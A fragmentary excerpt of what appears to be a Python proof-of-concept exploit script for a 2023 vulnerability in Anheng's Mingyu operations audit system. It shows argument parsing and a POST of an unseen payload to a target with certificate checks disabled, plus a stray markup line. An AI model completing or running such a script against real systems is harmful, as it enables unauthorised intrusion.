...
def main():
    banner()
    parse = argparse.ArgumentParser(description="2023_HW_安恒明御运维审计与风险控制系统漏洞复现以及POC")
...
<string>102</string>
    ...
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=body,verify=False,timeout=5,proxies=proxies)
